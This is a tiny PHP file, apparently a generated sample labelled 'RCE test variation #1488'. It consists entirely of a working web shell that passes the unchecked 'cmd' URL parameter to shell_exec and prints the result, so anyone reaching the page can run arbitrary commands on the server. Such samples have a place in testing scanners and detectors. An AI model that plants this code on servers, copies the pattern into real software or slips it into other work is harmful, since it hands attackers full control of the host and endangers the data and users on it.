<?php
// RCE test variation #1488
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>